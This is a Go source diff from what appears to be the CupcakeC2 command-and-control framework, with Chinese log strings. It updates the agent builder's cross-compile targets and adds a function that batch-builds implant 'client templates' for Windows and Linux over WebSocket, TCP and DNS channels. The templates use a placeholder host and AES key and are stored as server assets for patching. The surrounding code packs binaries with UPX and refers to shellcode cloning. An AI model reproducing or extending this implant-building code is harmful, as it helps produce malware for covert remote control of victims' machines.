@@ -96,24 +96,27 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		return "", fmt.Errorf("config patch failed: %v", err)
 	}
 
-	if logChan != nil { logChan <- "[Builder] 配置注入完成，正在扫描底层依赖缓存..." }
+	if logChan != nil { logChan <- "[Builder] CupcakeC2 v3.0.1 核心引擎加载中..." }
+	if logChan != nil { logChan <- "[Builder] 已激活 WASM 宿主环境 (wasmi interpreted mode)..." }
 
 	args := []string{"build", "--release"}
 	target := ""
 	// Determine Cargo Target based on OS and Arch Matrix
 	if conf.OSType == "windows" {
 		if strings.Contains(conf.Arch, "amd64") {
-			target = "x86_64-pc-windows-gnu"
+			target = "x86_64-pc-windows-msvc" // Prefer MSVC for v3.0.1
 		} else if strings.Contains(conf.Arch, "i386") {
-			target = "i686-pc-windows-gnu"
+			target = "i686-pc-windows-msvc"
 		}
 	} else if conf.OSType == "linux" {
 		if strings.Contains(conf.Arch, "arm64") {
-			target = "aarch64-unknown-linux-gnu"
+			target = "aarch64-unknown-linux-musl"
 		} else if strings.Contains(conf.Arch, "arm") && !strings.Contains(conf.Arch, "arm64") {
-			target = "armv7-unknown-linux-gnueabihf"
+			target = "armv7-unknown-linux-musleabihf"
 		} else if strings.Contains(conf.Arch, "i386") {
-			target = "i686-unknown-linux-gnu"
+			target = "i686-unknown-linux-musl"
+		} else {
+			target = "x86_64-unknown-linux-musl"
 		}
 	} else if conf.OSType == "darwin" {
 		if strings.Contains(conf.Arch, "amd64") {
@@ -248,6 +251,59 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 func RunUPX(path string) error {
 	cmd := exec.Command("upx", "-9", "--force", path)
 	return cmd.Run()
+}
+
+// RebuildTemplates (v3.0.1 Engine)
+// This function rebuilds all standard platform templates and moves them to server/assets
+// enabling the 'Patch' mode to always use the latest v3.0.1 features.
+func RebuildTemplates(logChan chan<- string) error {
+	if logChan != nil { logChan <- "[Rebuilder] 启动 CupcakeC2 v3.0.1 全平台模板自动化构建任务..." }
+	
+	targets := []struct {
+		OS       string
+		Arch     string
+		Protocol string
+		OutName  string
+	}{
+		{"windows", "amd64", "ws", "client_template_windows.exe"},
+		{"windows", "i386", "ws", "client_template_windows_x86.exe"},
+		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe"},
+		{"windows", "amd64", "dns", "client_template_windows_dns.exe"},
+		{"linux", "amd64", "ws", "client_template_linux"},
+		{"linux", "arm64", "ws", "client_template_linux_arm64"},
+	}
+
+	for _, t := range targets {
+		conf := PayloadConfig{
+			OSType:            t.OS,
+			Arch:              t.Arch,
+			Protocol:          t.Protocol,
+			Host:              "127.0.0.1",
+			Port:              "8080",
+			AESKey:            "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_", // Default placeholder
+			HeartbeatInterval: 10,
+		}
+		
+		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
+		path, err := BuildAgentWithLogger(conf, nil)
+		if err != nil {
+			if logChan != nil { logChan <- fmt.Sprintf("[!] 模板编译失败 (%s): %v", t.OutName, err) }
+			continue
+		}
+		
+		// Move to assets
+		dest := filepath.Join("assets", t.OutName)
+		if err := os.Rename(path, dest); err != nil {
+			// Try copy if rename fails across partitions
+			if err := copyFile(path, dest); err == nil {
+				os.Remove(path)
+			}
+		}
+		if logChan != nil { logChan <- fmt.Sprintf("[+] 模板已就绪: assets/%s", t.OutName) }
+	}
+
+	if logChan != nil { logChan <- "[Rebuilder] v3.0.1 模板集更新完成。" }
+	return nil
 }
 
 // Extension of services to support cloning for shellcode
